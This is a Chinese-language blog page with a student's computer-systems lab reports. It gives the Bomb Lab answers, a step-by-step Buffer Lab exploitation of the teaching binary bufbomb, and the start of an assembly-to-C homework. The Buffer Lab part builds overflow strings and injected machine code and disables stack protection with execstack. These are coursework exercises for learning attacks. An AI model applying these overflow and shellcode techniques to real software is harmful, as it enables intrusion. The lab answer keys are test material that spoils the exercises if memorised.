<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s <span class="number">0</span>x804aa30</span><br><span class="line"><span class="number">0</span>x804aa30 &lt;input_strings+<span class="number">400</span>&gt;:  <span class="string">&quot;12&quot;</span></span><br><span class="line">...</span><br><span class="line">(gdb) x/d <span class="number">0</span>x804a66c</span><br><span class="line"><span class="number">0</span>x804a66c &lt;node0&gt;:      <span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>接下来程序调用了函数fun6，并将返回值放入到<code>-0x4(%ebp)</code>中；其中第18到24行为链表的访问，执行8次后跳出循环。最后终止时比较与 atoi 转换的结果是否一致。通过阅读fun6的反汇编代码可知fun6函数并没有使用到atoi 转换的结果，所以直接运行到第27行查看寄存器<code>%edx</code>的值，该值为fun6得到的结果：149。最终答案为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">149</span></span><br></pre></td></tr></table></figure>

<h3 id="实验结果-1"><a href="#实验结果-1" class="headerlink" title="实验结果"></a>实验结果</h3><p>phase1~6的答案如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The <span class="built_in">future</span> will be better tomorrow.</span><br><span class="line"><span class="number">5</span> <span class="number">10</span> <span class="number">15</span> <span class="number">20</span> <span class="number">25</span> <span class="number">30</span></span><br><span class="line"><span class="number">0</span> t <span class="number">870</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">7</span> <span class="number">93</span></span><br><span class="line"><span class="number">149</span></span><br></pre></td></tr></table></figure>

<p>按照阶段依次输入上面分析的答案，运行结果截图如下：</p>
<img src="C:\Users\YMZ\AppData\Roaming\Typora\typora-user-images\image-20221029143516251.png" alt="image-20221029143516251" style="zoom:67%;" />



<h2 id="实验3：缓冲区溢出（Buffer-Lab）"><a href="#实验3：缓冲区溢出（Buffer-Lab）" class="headerlink" title="实验3：缓冲区溢出（Buffer Lab）"></a>实验3：缓冲区溢出（Buffer Lab）</h2><h3 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h3><ul>
<li><p>掌握函数调用时的栈帧结构</p>
</li>
<li><p>利用输入缓冲区的溢出漏洞，将攻击代码嵌入当前程序的栈帧中，使得程序执行我们所期望的过程</p>
</li>
</ul>
<h3 id="实验介绍-2"><a href="#实验介绍-2" class="headerlink" title="实验介绍"></a>实验介绍</h3><ul>
<li><p>文件组成</p>
<ul>
<li>makecookie：生成cookie    例：.&#x2F;makecookie SA18225155 生成cookie</li>
<li>Bufbomb：可执行程序-攻击对象</li>
<li>Sendstring:  字符格式转换</li>
</ul>
</li>
<li><p>bufbomb程序</p>
</li>
</ul>
<p>Bufbomb中包含一个getbuf函数，该函数实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// 对buf没有越界检查,超过11个字符将溢出</span></span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>getbuf的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08048fe0 &lt;getbuf&gt;:</span><br><span class="line"> 8048fe0:	55                   	push   %ebp				#压入返回地址</span><br><span class="line"> 8048fe1:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048fe3:	83 ec 18             	sub    $0x18,%esp		#allocate 24B</span><br><span class="line"> 8048fe6:	8d 45 f4             	lea    -0xc(%ebp),%eax	#get string address</span><br><span class="line"> 8048fe9:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048fec:	e8 6f fe ff ff       	call   8048e60 &lt;Gets&gt;</span><br><span class="line"> 8048ff1:	b8 01 00 00 00       	mov    $0x1,%eax		#return 1;</span><br><span class="line"> 8048ff6:	c9                   	leave  </span><br><span class="line"> 8048ff7:	c3                   	ret    </span><br><span class="line"> 8048ff8:	90                   	nop</span><br><span class="line"> 8048ff9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi</span><br></pre></td></tr></table></figure>

<ul>
<li>溢出</li>
</ul>
<p>溢出的字符将覆盖栈帧上的数据，特别的，会覆盖程序调用的返回地址，赋予我们控制程序流程的能力；通过构造溢出字符串，程序将“返回”至我们想要的代码上。</p>
<ul>
<li>字符构造</li>
</ul>
<p>计算机系统中，字符以ASCII码表示 &#x2F;存储，例如，输入’1’，存储为’0x31’。本实验也需要扩展的ASCII码（128~255）。为了构造所需要的地址或其他数据，我们需要逆反”字符-&gt;ASCII码”的过程；采用代码包给出的 sendstring工具。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sendstring &lt; exploit.txt &gt; exploit<span class="literal">-raw</span>.txt</span><br></pre></td></tr></table></figure>

<p>其中exploit.txt保存目标数据（即空格分隔的ASCII码），exploit-raw.txt为逆向出的字符串。</p>
<ul>
<li>字符串输入</li>
</ul>
<p>前述方法构造出的字符串按如下方式输入：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bufbomb <span class="literal">-t</span> SA18225155 &lt; exploit<span class="literal">-raw</span>.txt</span><br></pre></td></tr></table></figure>

<p>从标准输入设备输入：ALT+ASC码的十进制数（小键盘输入）。注意，最后一个数字按下后与ALT键同时放开。例，输入字符“1”为ALT+49。实验完成后提交exploit.txt文件。</p>
<ul>
<li>指令构造方法示例</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pushl $0x89abcdef 	# Push value onto stack </span><br><span class="line">addl $17,%eax 		# Add 17 to %eax </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>保存成example.s，然后输入命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c example.s </span><br><span class="line">objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure>

<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0: Candle"></a>Level 0: Candle</h4><blockquote>
<p>目标：Bufbomb中一个正常情况下不会被执行的函数smoke，在getbuf返回时跳到smoke函数执行。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">smoke</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    entry_check(<span class="number">0</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Smoke!: You called smoke()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要将smoke函数的地址放入getbuf的返回地址，需要构造合适的输入字符串。通过阅读getbuf的汇编代码可以知道输入字符串首地址被存放在内存栈<code>-0xc(%ebp)</code>中，运行程序，输入测试字符串，并打印出该字符串作验证。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb bufbomb</span><br><span class="line">(gdb) b getbuf</span><br><span class="line">(gdb) run -t SA22011137</span><br><span class="line">Starting program: /home/ubuntu/桌面/bufferlab/bufbomb -t SA22011137</span><br><span class="line">Team: SA22011137</span><br><span class="line">Cookie: 0x58932f5a</span><br><span class="line">...</span><br><span class="line">(gdb) x/s $ebp-0xc</span><br><span class="line">0xffffb96c:     &quot;hello world&quot;</span><br></pre></td></tr></table></figure>

<p>所以可以知道字符串首地址<code>0xffffb96c</code>。用smoke函数的地址覆盖getbuf的返回地址，还需要找到函数smoke函数的首地址：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x &amp;smoke</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0x8048e20</span></span><br></pre></td></tr></table></figure>

<p>在test的汇编代码中，getbuf的下一行指令的地址为<code>0x804901e</code>，该地址在调用getbuf后被保存在<code>%ebp+0x4</code>中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">08049000 &lt;test&gt;:</span><br><span class="line">...</span><br><span class="line"> 8049019:	e8 c2 ff ff ff       	call   8048fe0 &lt;getbuf&gt;</span><br><span class="line"> 804901e:	89 c2                	mov    %eax,%edx</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x $ebp+4</span><br><span class="line">0xffffb97c:     0x0804901e</span><br></pre></td></tr></table></figure>

<p>从<code>0xffffb96c</code>覆盖到<code>0xffffb97c</code>，需要先填充 16字节字符串内容，然后填充smoke函数的地址：<code>20</code>,<code>8e</code>,<code>04</code>,<code>08</code>（小端机器），如果是 64 位机器则需要继续覆盖后面为 0。所以我们需要构造字符串十六进制表示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// exploit0.txt</span><br><span class="line">31 31 31 31 31 31 31 31 </span><br><span class="line">32 32 32 32 32 32 32 32 </span><br><span class="line">20 8e 04 08 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>使用工具生成字符串并运行程序，结果如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./sendstring &lt; exploit0.txt &gt; exploit<span class="literal">-raw</span>.txt</span><br><span class="line">./bufbomb <span class="literal">-t</span> SA22011137 &lt; exploit<span class="literal">-raw</span>.txt</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\YMZ\AppData\Roaming\Typora\typora-user-images\image-20221029171139653.png" alt="image-20221029171139653"></p>
<h4 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1: Sparkler"></a>Level 1: Sparkler</h4><blockquote>
<p>目标：调用 fizz(val) 函数，并将自己的 cookies 传递为参数。（Cookie必须为自己学号生成）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fizz</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    entry_check(<span class="number">1</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印该函数地址：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x fizz</span><br><span class="line"><span class="number">0</span>x8048dc0 &lt;fizz&gt;:       <span class="number">0</span>x53e58955</span><br></pre></td></tr></table></figure>

<p>生成cookie：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./makecookie SA22011137</span><br><span class="line"><span class="number">0</span>x58932f5a</span><br></pre></td></tr></table></figure>

<p>部分反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">08048dc0 &lt;fizz&gt;:</span><br><span class="line">...</span><br><span class="line"> 8048dc4:	83 ec 14             	sub    $0x14,%esp</span><br><span class="line"> 8048dc7:	8b 5d 08             	mov    0x8(%ebp),%ebx	# 传入参数值</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>通过阅读汇编代码可以知道，0x8(%ebp)是传入的参数的存放地址，即$ebp+8,这里需要将其覆盖为生成的cookie值作为输入，而$ebp+4是原来正常的返回地址，需要覆盖为fizz的地址<code>0x8048dc0</code>。构造输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// exploit1.txt</span><br><span class="line">31 31 31 31 31 31 31 31 </span><br><span class="line">32 32 32 32 32 32 32 32 </span><br><span class="line">c0 8d 04 08 00 00 00 00 </span><br><span class="line">5a 2f 93 58 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>使用工具生成字符串并运行程序，结果如下：</p>
<p><img src="C:\Users\YMZ\AppData\Roaming\Typora\typora-user-images\image-20221029190954349.png" alt="image-20221029190954349"></p>
<h4 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2: Firecracker"></a>Level 2: Firecracker</h4><blockquote>
<p>目标：含有一个 bang 函数，和一个全局变量 global_value，需要注入机器代码，修改 global_value 为 cookies 的值，再调用 bang 函数。具体指令构造方法参加实验说明文档。可通过execstack工具解除栈执行限制。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bang</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    entry_check(<span class="number">2</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    <span class="keyword">if</span> (global_value == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bang 汇编语言的前几行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">08048d60 &lt;bang&gt;:</span><br><span class="line"> 8048d60:	55                   	push   %ebp</span><br><span class="line"> 8048d61:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d63:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048d66:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)</span><br><span class="line"> 8048d6d:	e8 2e fc ff ff       	call   80489a0 &lt;entry_check&gt;</span><br><span class="line"> 8048d72:	a1 dc a1 04 08       	mov    0x804a1dc,%eax	#get global_value</span><br><span class="line"> 8048d77:	3b 05 cc a1 04 08    	cmp    0x804a1cc,%eax	#cmp global_value:cookie</span><br><span class="line"> 8048d7d:	74 21                	je     8048da0 &lt;bang+0x40&gt;</span><br></pre></td></tr></table></figure>

<p>汇编语言的第7、8行对应源程序的if语句，所以猜测global_value被存储在<code>0x804a1dc</code>中，cookie被存储在<code>0x804a1cc</code>中。检查如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x <span class="number">0</span>x804a1dc</span><br><span class="line"><span class="number">0</span>x804a1dc &lt;global_value&gt;: <span class="number">0</span>x00000000</span><br><span class="line">(gdb) x/x <span class="number">0</span>x804a1cc</span><br><span class="line"><span class="number">0</span>x804a1cc &lt;cookie&gt;:     <span class="number">0</span>x00000000</span><br></pre></td></tr></table></figure>

<p>思路是将汇编代码注入到char数组的首地址<code>0xffffb96c</code>，让char数组的首地址覆盖$eax+4y原来的返回地址，当发生ret时，就会跳转到char数组首地址执行注入的汇编代码。汇编代码中要先修改global_value的值，然后将 bang 函数的地址 push 进栈中，然后使用 ret 命令。当执行到注入的ret命令时，因为push了bang函数的地址，就会返回到bang函数执行。汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl  $0x58932f5a, 0x804a1dc		# global_value=cookie</span><br><span class="line">pushl $0x08048d60					# 将 bang 函数的首地址压入栈</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>将汇编语言转换成十六进制的机器代码：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="literal">-m32</span> <span class="literal">-c</span> example.s </span><br><span class="line">objdump <span class="literal">-d</span> example.o &gt; example.d</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	c7 05 dc a1 04 08 5a 	movl   $0x58932f5a,0x804a1dc</span><br><span class="line">   7:	2f 93 58 </span><br><span class="line">   a:	68 60 8d 04 08       	push   $0x8048d60</span><br><span class="line">   f:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>构造注入机器代码，转成字符串并运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// exploit2.txt</span><br><span class="line">c7 05 dc a1 04 08 5a 2f </span><br><span class="line">93 58 68 60 8d 04 08 c3</span><br><span class="line">6c b9 ff ff 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>结果出现段错误，是因为Linux系统默认开启了栈保护机制，用于阻止缓冲区溢出攻击。所以不可以在栈中直接执行指令，需要使用execstack工具解除栈执行限制。即使如此也只能在gdb调试下有效，实际运行仍然会出现段错误。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt<span class="literal">-get</span> install execstack 	<span class="comment">#安装execstack</span></span><br><span class="line">execstack <span class="literal">-s</span> bufbomb			<span class="comment">#修改程序堆栈的可执行属性</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\YMZ\AppData\Roaming\Typora\typora-user-images\image-20221029201251844.png" alt="image-20221029201251844"></p>
<p><img src="C:\Users\YMZ\AppData\Roaming\Typora\typora-user-images\image-20221029202121258.png" alt="image-20221029202121258"></p>
<h4 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3: Dynamite"></a>Level 3: Dynamite</h4><blockquote>
<p>目标：这个 Level 要求我们注入一段能够修改 getbuf 返回值的代码，返回值从 1 改成 cookie 值，此外还需要还原所有破坏，继续运行 test 的剩下部分。函数正常返回时执行 第15行，我们要让函数执行第12行</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    entry_check(<span class="number">3</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数的返回值保存在%eax中，所以将cookie值放入这个寄存器中，并将原来正确的返回地址（即call <getbuf>的下一条指令地址<code>0x804901e</code>）压入栈中，构造完成攻击的汇编代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x58932f5a, %eax		#move cookie to %eax, return %eax</span><br><span class="line">push $0x804901e				#push &lt;test&gt; return address</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>将汇编语言转换成十六进制的机器代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 5a 2f 93 58       	mov    $0x58932f5a,%eax</span><br><span class="line">   5:	68 1e 90 04 08       	push   $0x804901e</span><br><span class="line">   a:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>生成的机器代码一共是11个字节，再加上一个对齐字节凑足12字节，可以看到这时已经填满了char字符串的缓冲区。与上一个问题相同，还要用char字符串首地址<code>0xffffb96c</code>覆盖原来的返回地址，以便于执行注入的指令。但这里还要注意一点，为了保证栈不被破坏，除了必要的修改，我们必须保持其他的栈字保存不变，先打印出原来的数据：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/<span class="number">24</span>xb <span class="number">0</span>xffffb96c</span><br><span class="line"><span class="number">0</span>xffffb96c:     <span class="number">0</span>x31    <span class="number">0</span>x32    <span class="number">0</span>x33    <span class="number">0</span>x34    <span class="number">0</span>x00    <span class="number">0</span>x00    <span class="number">0</span>x00    <span class="number">0</span>x00</span><br><span class="line"><span class="number">0</span>xffffb974:     <span class="number">0</span>xc0    <span class="number">0</span>xb5    <span class="number">0</span>x04    <span class="number">0</span>x08    <span class="number">0</span>x98    <span class="number">0</span>xb9    <span class="number">0</span>xff    <span class="number">0</span>xff</span><br><span class="line"><span class="number">0</span>xffffb97c:     <span class="number">0</span>x1e    <span class="number">0</span>x90    <span class="number">0</span>x04    <span class="number">0</span>x08    <span class="number">0</span>x03    <span class="number">0</span>x00    <span class="number">0</span>x00    <span class="number">0</span>x00</span><br></pre></td></tr></table></figure>

<p>构造攻击代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// exploit3.txt</span><br><span class="line">b8 5a 2f 93 58 68 1e 90 </span><br><span class="line">04 08 c3 00 98 b9 ff ff</span><br><span class="line">6c b9 ff ff 03 00 00 00</span><br></pre></td></tr></table></figure>

<p>转成字符串并运行：</p>
<p><img src="C:\Users\YMZ\AppData\Roaming\Typora\typora-user-images\image-20221029210254503.png" alt="image-20221029210254503"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/30/SA22011137-%E6%9D%A8%E6%98%8E%E7%8F%A0-%E5%AE%9E%E9%AA%8C1&2&3/" data-id="cl9uxk00e0002gwom5xzkc0k2" data-title="" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-SA22011137-杨明珠-作业2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/30/SA22011137-%E6%9D%A8%E6%98%8E%E7%8F%A0-%E4%BD%9C%E4%B8%9A2/" class="article-date">
  <time class="dt-published" datetime="2022-10-30T05:22:09.957Z" itemprop="datePublished">2022-10-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="计算机系统作业2"><a href="#计算机系统作业2" class="headerlink" title="计算机系统作业2"></a>计算机系统作业2</h1><h2 id="3-58"><a href="#3-58" class="headerlink" title="3.58"></a>3.58</h2><p>一个函数的原型为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">decode2</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> y, <span class="type">long</span> z)</span>;</span><br></pre></td></tr></table></figure>

<p>GCC 产生如下汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">decode2:</span><br><span class="line">	subq 	%rdx, %rsi</span><br><span class="line">	imulq 	%rsi, %rdi</span><br><span class="line">	movq 	%rsi, %rax</span><br><span class="line">	salq 	$63,%rax</span><br><span class="line">	sarq 	$63, %rax</span><br><span class="line">	xorq 	%rdi, %rax</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>

<p>参数x 、y 和z 通过寄存器%rdi、%rsi 和 %rdx 传递。代码将返回值存放在寄存器%rax 中。写出等价于上述汇编代码的decode2 的C代码。</p>
<p><strong>解：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">decode2</span><span class="params">(<span class="type">long</span> x, <span class="type">long</span> y, <span class="type">long</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> tmp = y - z;</span><br><span class="line">  <span class="keyword">return</span> (tmp * x) ^ (tmp &lt;&lt; <span class="number">63</span> &gt;&gt; <span class="number">63</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-60"><a href="#3-60" class="headerlink" title="3.60"></a>3.60</h2><p>考虑下面的汇编代码：</p>
